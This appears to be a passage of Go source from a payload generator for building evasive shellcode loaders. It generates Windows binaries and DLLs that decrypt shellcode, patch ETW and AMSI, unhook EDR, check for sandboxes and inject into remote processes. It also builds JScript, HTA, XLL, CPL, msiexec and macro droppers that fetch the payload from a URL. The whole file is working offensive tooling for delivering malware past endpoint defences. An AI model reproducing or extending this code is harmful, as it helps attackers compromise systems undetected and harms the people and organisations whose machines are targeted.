	Binary.Variables["GetConsoleWindowName"] = Utils.StringEncode("GetConsoleWindow", b64number)
	Binary.Variables["ShowWindowName"] = Utils.StringEncode("ShowWindow", b64number)
	Binary.Variables["WriteProcessMemoryName"] = Utils.StringEncode("WriteProcessMemory", b64number)
	Binary.Variables["MI"] = Cryptor.VarNumberLength(4, 9)

	WindowsVersion.Variables["Version"] = Binary.Variables["Version"]
	WindowsVersion.Variables["syscall"] = Binary.Variables["syscall"]
	WindowsVersion.Variables["customsyscall"] = Binary.Variables["customsyscall"]
	WindowsVersion.Variables["customsyscallVP"] = Binary.Variables["customsyscallVP"]

	buffer.Reset()
	WindowsVersionTemplate, err := template.New("WindowsVersion").Parse(Struct.WindowsVersion_Syscall())
	if err != nil {
		log.Fatal(err)

	}
	buffer.Reset()
	if err := WindowsVersionTemplate.Execute(&buffer, WindowsVersion); err != nil {
		log.Fatal(err)
	}
	Binary.Variables["SyscallNumberlist"] = buffer.String()
	buffer.Reset()

	if console == true && ProcessInjection == "" {
		Binary.Variables["hide"] = Binary.Variables["Console"] + "(true)"
		Binary.Variables["DebugImport"] = `"io"
		"os"
		"fmt"`
		Binary.Variables["Debug"] = `
		var (
			debugWriter io.Writer
		)
		
		func printDebug(format string, v ...interface{}) {
			debugWriter = os.Stdout
			output := fmt.Sprintf("[DEBUG] ")
			output += format +"\n"
			fmt.Fprintf(debugWriter, output, v...)
		}
	`
		Binary.Variables["RefreshPE"] = "printDebug(\"RefreshPE failed:\", err)"
		Binary.Variables["EDR"] = "printDebug(\"[+] EDR removed\")"
		Binary.Variables["ShellcodeString"] = "printDebug(\"[*] Loading shellcode into a string\")"
		Binary.Variables["Pointer"] = "printDebug(\"[*] Create a Pointer on stack\")"
		Binary.Variables["CopyPointer"] = "printDebug(\"[*] Copy Pointer's attributes\")"
		Binary.Variables["OverwrittenShellcode"] = "printDebug(\"[*] Overwriten Pointer to point to shellcode String\")"
		Binary.Variables["OverWrittenPoint"] = "printDebug(\"[*] Overwriting shellcode String with Pointer's attributes\")"
		Binary.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: \"+" + Binary.Variables["DLLname"] + "+\" \")"
		Binary.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + WindowsVersion.Variables["Version"] + ")"

	} else if console == true && ProcessInjection != "" {
		Binary.Variables["hide"] = Binary.Variables["Console"] + "(true)"
		Binary.Variables["DebugImport"] = `"io"
		"os"`
		Binary.Variables["Debug"] = ` 
		var (
			debugWriter io.Writer
		)
		
		func printDebug(format string, v ...interface{}) {
			debugWriter = os.Stdout
			output := fmt.Sprintf("[DEBUG] ")
			output += format +"\n"
			fmt.Fprintf(debugWriter, output, v...)
		}
	`
		Binary.Variables["RefreshPE"] = "printDebug(\"RefreshPE failed:\", err)"
		Binary.Variables["EDR"] = "printDebug(\"[+] EDR removed\")"
		Binary.Variables["ShellcodeString"] = "printDebug(\"[*] Loading shellcode into a string\")"
		Binary.Variables["Pointer"] = "printDebug(\"[*] Create a Pointer on stack\")"
		Binary.Variables["CopyPointer"] = "printDebug(\"[*] Copy Pointer's attributes\")"
		Binary.Variables["OverwrittenShellcode"] = "printDebug(\"[*] Overwriten Pointer to point to shellcode String\")"
		Binary.Variables["OverWrittenPoint"] = "printDebug(\"[*] Overwriting shellcode String with Pointer's attributes\")"
		Binary.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: \"+" + Binary.Variables["DLLname"] + "+\" \")"
		Binary.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + WindowsVersion.Variables["Version"] + ")"

		Binary.Variables["PPIDMessage"] =
			`strpid := fmt.Sprint(` + Binary.Variables["pi"] + `.ProcessId)
	printDebug("[*] Creating Remote Process: " + strpid)
	printDebug("[*] Creating Handle to Remote Process")`
		Binary.Variables["ModuleMessage"] = "printDebug(\"[*] Mapping Modules:\")"
		Binary.Variables["addr"] = Cryptor.VarNumberLength(10, 19)
		Binary.Variables["RemoteModuleEnumeration"] =
			`` + Binary.Variables["addr"] + `:= fmt.Sprintf("%X", ` + Binary.Variables["MI"] + `.LpBaseOfDll)
			printDebug("[+] " + ` + Binary.Variables["s"] + ` + "'s Base Address: " + ` + Binary.Variables["addr"] + `)
			printDebug("[*] Reloading " + ` + Binary.Variables["s"] + ` + "'s .Text Field")`
		Binary.Variables["RemoteModuleMessage"] = "printDebug(\"[+] Reloaded and unhooked EDR\")"
		Binary.Variables["RemoteReloading"] = "printDebug(\"[+] Interacting with Remote Process\")"
		Binary.Variables["Injecting"] = "printDebug(\"[+] Injecting Shellcode into Remote Process\")"
		Binary.Variables["Injected"] = "printDebug(\"[+] Injected!\")"

	} else {
		Binary.Variables["hide"] = Binary.Variables["Console"] + "(false)"
		Binary.Variables["DebugImport"] = ""
		Binary.Variables["Debug"] = ""
		Binary.Variables["RefreshPE"] = ""
		Binary.Variables["EDR"] = ""
		Binary.Variables["ShellcodeString"] = ""
		Binary.Variables["Pointer"] = ""
		Binary.Variables["CopyPointer"] = ""
		Binary.Variables["OverwrittenShellcode"] = ""
		Binary.Variables["OverWrittenPoint"] = ""
		Binary.Variables["ReloadingMessage"] = ""
		Binary.Variables["VersionMessage"] = ""

		Binary.Variables["RemoteModuleEnumeration"] = ""
		Binary.Variables["PPIDMessage"] = ""
		Binary.Variables["ModuleMessage"] = ""
		Binary.Variables["RemoteModuleMessage"] = ""
		Binary.Variables["RemoteReloading"] = ""
		Binary.Variables["Injecting"] = ""
		Binary.Variables["Injected"] = ""
	}

	if sandbox == true {
		if console == true {
			Binary.Variables["SandboxOS"] = ""
		} else {
			Binary.Variables["SandboxOS"] = `"os"`
		}
		Binary.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(10, 19)
		Binary.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
		Binary.Variables["status"] = Cryptor.VarNumberLength(10, 19)
		SandboxFunctionTemplate, err := template.New("Sandboxfunction").Parse(Struct.Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err := SandboxFunctionTemplate.Execute(&buffer, Binary); err != nil {
			log.Fatal(err)
		}
		Binary.Variables["Sandboxfunction"] = buffer.String()
		Binary.Variables["checker"] = Cryptor.VarNumberLength(10, 19)
		Sandbox_DomainJoinedTemplate, err := template.New("Sandbox_DomainJoined").Parse(Struct.Sandbox_DomainJoined())
		buffer.Reset()
		if err != nil {
			log.Fatal(err)
		}
		if err := Sandbox_DomainJoinedTemplate.Execute(&buffer, Binary); err != nil {
			log.Fatal(err)
		}
		Binary.Variables["Sandbox"] = buffer.String()
		buffer.Reset()
	} else {
		Binary.Variables["Sandbox"] = ""
		Binary.Variables["Sandboxfunction"] = ""
		Binary.Variables["SandboxImport"] = ""
		Binary.Variables["SandboxOS"] = ""
	}

	if (ETW == false || AMSI == false) || ProcessInjection != "" {
		WriteProcessMemory_Function, decode, WriteProcessMemory := WriteProcessMemory_Buff(Binary.Variables["b64number"], b64number)
		Binary.Variables["decode"] = decode
		Binary.Variables["WriteProcessMemory_Function"] = WriteProcessMemory_Function
		Binary.Variables["WriteProcessMemory"] = WriteProcessMemory
	} else {
		Binary.Variables["WriteProcessMemory_Function"] = ""
	}
	if ETW == false {
		ETW_Function, ETW := ETW_Buff(b64number, Binary.Variables["decode"], Binary.Variables["WriteProcessMemory"])
		Binary.Variables["ETW"] = ETW + "()"
		Binary.Variables["ETW_Function"] = ETW_Function
		Binary.Variables["B64"] = `"encoding/base64"`
	} else {
		Binary.Variables["ETW"] = ""
		Binary.Variables["ETW_Function"] = ""
		Binary.Variables["B64"] = ``
	}
	if AMSI == false {
		AMSI_Function, AMSI := AMSI_Buff(Binary.Variables["WriteProcessMemory"])
		Binary.Variables["AMSI_Function"] = AMSI_Function
		Binary.Variables["AMSI"] = AMSI + "()"

	} else {
		Binary.Variables["AMSI_Function"] = ""
		Binary.Variables["AMSI"] = ""
	}

	if ETW == false || AMSI == false {
		Binary.Variables["HEX_Import"] = `"encoding/hex"`
	} else {
		Binary.Variables["HEX_Import"] = ``
	}
	if AMSI == false {
		AMSI_Function, AMSI := AMSI_Buff(Binary.Variables["WriteProcessMemory"])
		Binary.Variables["AMSI_Function"] = AMSI_Function
		Binary.Variables["AMSI"] = AMSI + "()"

	} else {
		Binary.Variables["AMSI_Function"] = ""
		Binary.Variables["AMSI"] = ""
	}

	if ETW == false || AMSI == false {
		Binary.Variables["HEX_Import"] = `"encoding/hex"`
	} else {
		Binary.Variables["HEX_Import"] = ``
	}

	if ProcessInjection != "" {
		ProcessInjection = strings.Replace(ProcessInjection, "\\", "\\\\", -1)
		Binary.Variables["processpath"] = ProcessInjection

		Binary.Variables["offset"] = Cryptor.VarNumberLength(4, 9)
		Binary.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)
		Structure = Struct.Procces_Injection()

	} else {
		Structure = Struct.Binary()
	}

	if Sleep == false {
		Binary.Variables["SleepSecond"] = strconv.Itoa(Cryptor.GenerateNumer(2220, 2900))
		fmt.Println("[+] Sleep Timer set for " + Binary.Variables["SleepSecond"] + " milliseconds ")
	} else {
		Binary.Variables["SleepSecond"] = "0"
	}

	BinaryTemplate, err := template.New("Binary").Parse(Structure)
	if err != nil {
		log.Fatal(err)
	}
	if err := BinaryTemplate.Execute(&buffer, Binary); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), Binary.Variables["FuncName"], Binary.Variables["NTFuncName"]
}

func Shellcode_Buff(b64ciphertext string, b64key string, b64iv string, FuncName string, NTFuncName string) {
	var buffer bytes.Buffer
	Shellcode := &Shellcode{}
	Shellcode.Variables = make(map[string]string)
	buffer.Reset()
	Shellcode.Variables["FuncName"] = FuncName
	Shellcode.Variables["fullciphertext"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["ciphertext"] = Utils.B64ripper(b64ciphertext, Shellcode.Variables["fullciphertext"], true)
	Shellcode.Variables["key"] = b64key
	Shellcode.Variables["iv"] = b64iv
	Shellcode.Variables["vkey"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["viv"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["block"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["decrypted"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["mode"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["vciphertext"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["rawdata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["stuff"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["raw_bin"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["hexdata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["PKCS5UnPadding"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["length"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["src"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["unpadding"] = Cryptor.VarNumberLength(10, 19)

	Shellcode.Variables["sysid"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["processHandle"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["baseAddress"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["regionSize"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["NewProtect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["oldprotect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["NtProtectVirtualMemoryprep"] = NTFuncName

	ShellcodeTemplate, err := template.New("Shellcode").Parse(Struct.Decrypt_Function())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := ShellcodeTemplate.Execute(&buffer, Shellcode); err != nil {
		log.Fatal(err)
	}
	Utils.PackageEditor("loader/loader.go", "Shellcodefunc", buffer.String())

}

func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool, CommandLoader string) (string, string, string) {
	var LoaderTemplate string
	var buffer bytes.Buffer
	JScriptLoader := &JScriptLoader{}
	JScriptLoader.Variables = make(map[string]string)
	JScriptLoader.Variables["fso"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["dropPath"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["value"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["strRegPath"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["WshShell"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["objShell"] = Cryptor.VarNumberLength(10, 19)
	if mode == "excel" {
		JScriptLoader.Variables["ApplicationName"] = "excel.exe"
		JScriptLoader.Variables["RegName"] = "Excel"
		JScriptLoader.Variables["dllext"] = ".xll"
		JScriptLoader.Variables["objapp"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["Application_Version"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["FileName"] = name
		JScriptLoader.Variables["filename"] = filename
		LoaderTemplate = Struct.JS_Office_Sub()
	}
	if mode == "control" {
		LoaderTemplate = Struct.JS_Control_Sub()
		JScriptLoader.Variables["dllext"] = ".cpl"
		JScriptLoader.Variables["filename"] = filename
		JScriptLoader.Variables["FileName"] = name
	}
	if mode == "msiexec" {
		LoaderTemplate = Struct.JS_Msiexec_Sub()
		JScriptLoader.Variables["dllext"] = ".dll"
		JScriptLoader.Variables["filename"] = filename
		JScriptLoader.Variables["FileName"] = name
		if CommandLoader == "hta" {
			JScriptLoader.Variables["System32"] = "Sysnative"
		} else {
			JScriptLoader.Variables["System32"] = "System32"
		}
	}
	if mode == "wscript" {
		JScriptLoader.Variables["dllext"] = ".dll"
		JScriptLoader.Variables["FileName"] = name
		JScriptLoader.Variables["DLLName"] = name
		JScriptLoader.Variables["manifest"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["ax"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["Execute"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["progid"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["filename"] = name
		LoaderTemplate = Struct.WS_JS()
	}
	buffer.Reset()
	JSLoaderTemplate, err := template.New("JScriptLoader").Parse(LoaderTemplate)
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = JSLoaderTemplate.Execute(&buffer, JScriptLoader); err != nil {
		log.Fatal(err)
	}

	return buffer.String(), JScriptLoader.Variables["fso"], JScriptLoader.Variables["dropPath"]

}

func JScript_Buff(fso string, dropPath string, encoded string, code string, name string, mode string, sandbox bool) string {
	var buffer bytes.Buffer
	JScript := &JScript{}
	SandboxJScript := &SandboxJScript{}
	JScript.Variables = make(map[string]string)
	SandboxJScript.Variables = make(map[string]string)
	JScript.Variables["DLLName"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["fso"] = fso
	JScript.Variables["dropPath"] = dropPath
	JScript.Variables["Base64"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["base6411"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["rtest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["atest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["ctest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["ttest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["etest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["htest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["atest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["TextStream11"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["res1"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["filename1"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["characters"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["base6411decoded"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["BinaryStream"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["binaryWriter"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["dllname"] = ""
	JScript.Variables["dllvar"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["dll"] = Utils.B64ripper(encoded, JScript.Variables["dllvar"], false)
	JScript.Variables["Loader"] = code
	JScript.Variables["Magic1"] = Cryptor.VarNumberLength(10, 19)

	if mode == "excel" {
		JScript.Variables["dllext"] = ".xll"
		JScript.Variables["FileName"] = name
	}
	if mode == "control" {
		JScript.Variables["dllext"] = ".cpl"
		JScript.Variables["FileName"] = name
	}
	if mode == "wscript" {
		JScript.Variables["dllext"] = ".dll"
		JScript.Variables["FileName"] = name
	}
	if mode == "msiexec" {
		JScript.Variables["dllext"] = ".dll"
		JScript.Variables["FileName"] = name
	}
	buffer.Reset()
	JSTemplate, err := template.New("JScript").Parse(Struct.JSfile())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = JSTemplate.Execute(&buffer, JScript); err != nil {
		log.Fatal(err)
	}

	if sandbox == true {
		SandboxJScript.Variables["objShell"] = Cryptor.VarNumberLength(10, 19)
		SandboxJScript.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
		SandboxJScript.Variables["loader"] = buffer.String()
		buffer.Reset()
		SandboxJSTemplate, err := template.New("SandboxJScript").Parse(Struct.WScript_Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err = SandboxJSTemplate.Execute(&buffer, SandboxJScript); err != nil {
			log.Fatal(err)
		}
	} else {

	}
	return buffer.String()
}

func HTA_Buff(hexcode string, filename string, HTAtemplate string) string {
	var buffer bytes.Buffer
	var HTATemplate_Struct string
	HTALoader := &HTALoader{}
	HTALoader.Variables = make(map[string]string)
	HTALoader.Variables["payload"] = hexcode
	HTALoader.Variables["RNZyt"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["bogusWindows1252Chars"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["correctLatin1Chars"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["fos"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["obshell"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["pathworks"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["dest"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["fromByte"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["chunkSize"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["source"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decodedFile"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["hexString"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["fromByte"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decodedFile"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["sleep"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["obshell"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["test1"] = Cryptor.VarNumberLength(4, 9)

	if HTAtemplate == "HTA_WScript" {
		HTALoader.Variables["filename"] = filename + ".js"
		HTATemplate_Struct = Struct.HTA_WScript()
	} else {
		HTALoader.Variables["filename"] = filename
		HTATemplate_Struct = Struct.HTA()
	}

	buffer.Reset()
	HTATemplate, err := template.New("HTALoader").Parse(HTATemplate_Struct)
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = HTATemplate.Execute(&buffer, HTALoader); err != nil {
		log.Fatal(err)
	}
	return buffer.String()
}

func Macro_Buff(URL string, outFile string) {
	var buffer bytes.Buffer
	macro := &Macro{}
	macro.Variables = make(map[string]string)
	macro.Variables["HTTPReq"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["t"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["remoteFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["pathOfFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["obj"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["Full"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["output"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["storeIn"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["sleep"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["outFile"] = outFile
	macro.Variables["URL"] = URL

	buffer.Reset()
	macroTemplate, err := template.New("macro").Parse(Struct.Macro())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := macroTemplate.Execute(&buffer, macro); err != nil {
		log.Fatal(err)
	}
	fmt.Println(buffer.String())
}

func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool, ETW bool, ProcessInjection string, sleep bool, AMSI bool) (string, string) {
	var code, FuncName, NTFuncName string
	name, filename := FileName(mode)
	if ETW == false {
		fmt.Println("[+] Patched ETW Enabled")
	}
	if AMSI == false {
		fmt.Println("[+] Patched AMSI Enabled")
	}
	if ProcessInjection != "" {
		fmt.Println("[+] Process Injection Mode Enabled")
		fmt.Println("[*] Created Process: " + ProcessInjection)
	}
	if mode == "excel" || mode == "wscript" || mode == "control" || mode == "dll" || mode == "msiexec" {
		code, FuncName, NTFuncName = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox, ETW, ProcessInjection, AMSI)
	} else {
		code, FuncName, NTFuncName = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, name, ETW, ProcessInjection, sleep, AMSI)
	}
	os.MkdirAll(name, os.ModePerm)
	Utils.Writefile(name+"/"+name+".go", code)
	Utils.B64decode("loader.zip")
	Utils.Unzip("loader.zip", name)
	os.RemoveAll("loader.zip")
	if mode == "binary" {
		Utils.B64decode("icons.zip")
		Utils.Unzip("icons.zip", name)
		os.RemoveAll("icons.zip")
	}
	if mode == "control" {
		Utils.B64decode("control.zip")
		Utils.Unzip("control.zip", name)
		os.RemoveAll("control.zip")
	}
	if mode == "wscript" {
		Utils.B64decode("wscript.zip")
		Utils.Unzip("wscript.zip", name)
		os.RemoveAll("wscript.zip")
	}
	if mode == "excel" {
		Utils.B64decode("excel.zip")
		Utils.Unzip("excel.zip", name)
		os.RemoveAll("excel.zip")
	}
	if mode == "dll" || mode == "msiexec" {
		Utils.B64decode("dll.zip")
		Utils.Unzip("dll.zip", name)
		os.RemoveAll("dll.zip")
	}

	os.Chdir(name)
	Shellcode_Buff(b64ciphertext, b64key, b64iv, FuncName, NTFuncName)
	Utils.ModuleObfuscator(name, FuncName)
	return name, filename
}
func CompileLoader(mode string, outFile string, filename string, name string, CommandLoader string, URL string, sandbox bool, Sha bool, path string) {
	if mode == "excel" {
		os.Rename(name+".dll", name+".xll")
	} else if mode == "control" {
		os.Rename(name+".dll", name+".cpl")
		if outFile == "" {
			os.Chdir("..")
			os.Rename(name+"/"+name+".cpl", name+".cpl")
			os.RemoveAll(name)
			fmt.Println("[+] " + name + ".cpl File Ready")
			if CommandLoader == "control" {
				outFile = name + ".cpl"
				Utils.Command(URL, CommandLoader, outFile)
			}
			if path != "" {
				Utils.FileMover(name, path)
			}
			return
		}
	} else if mode == "wscript" {
		os.Rename(outFile+".dll", name+".dll")
	} else if mode == "msiexec" {
		os.Rename(outFile+".dll", name+".dll")
	} else if mode == "binary" {
		os.Chdir("..")
		os.Rename(name+"/"+name+".exe", name+".exe")
		os.RemoveAll(name)
		if path != "" {
			Utils.FileMover(name, path)
		}
		fmt.Println("[+] Binary Compiled")
		if CommandLoader == "bits" {
			outFile = name + ".exe"
			Utils.Command(URL, CommandLoader, outFile)
		}
		return
	} else if mode == "dll" {
		os.Chdir("..")
		os.Rename(name+"/"+name+".dll", name+".dll")
		os.RemoveAll(name)
		fmt.Println("[+] DLL Compiled")
		fmt.Println("[!] Note: Loading a dll (with Rundll32 or Regsvr32) that has the same name as a valid system DLL will cause problems, in this case its best to change the name slightly")
		if path != "" {
			Utils.FileMover(name, path)
		}
		return
	}
	fmt.Println("[*] Creating Loader")
	code, fso, dropPath := JScriptLoader_Buff(name, filename, mode, sandbox, CommandLoader)
	f, _ := os.Open(filename)
	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)
	encoded := base64.StdEncoding.EncodeToString(content)
	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox)
	URL = Utils.Command(URL, CommandLoader, outFile)
	if CommandLoader == "hta" {
		var HTAtemplate string
		if mode == "wscript" {
			HTAtemplate = "HTA_WScript"
			finalcode = HTA_Buff(hex.EncodeToString([]byte(finalcode)), filename, HTAtemplate)
			if Sha == true {
				fmt.Println("[!] Note an additional file: " + filename + ".js will be dropped in the user's TEMP folder")
			}
		} else {
			HTAtemplate = "HTA"
			finalcode = HTA_Buff(finalcode, filename, HTAtemplate)
		}
	}
	if CommandLoader == "macro" {
		Macro_Buff(URL, outFile)
	}
	Utils.Writefile(outFile, finalcode)
	os.Chdir("..")
	os.Rename(name+"/"+outFile, outFile)
	if Sha == true {
		Utils.Sha256(outFile)
	}
	os.RemoveAll(name)
	if path != "" {
		Utils.FileMover(outFile, path)
	}
	fmt.Println("[+] Loader Compiled")
}
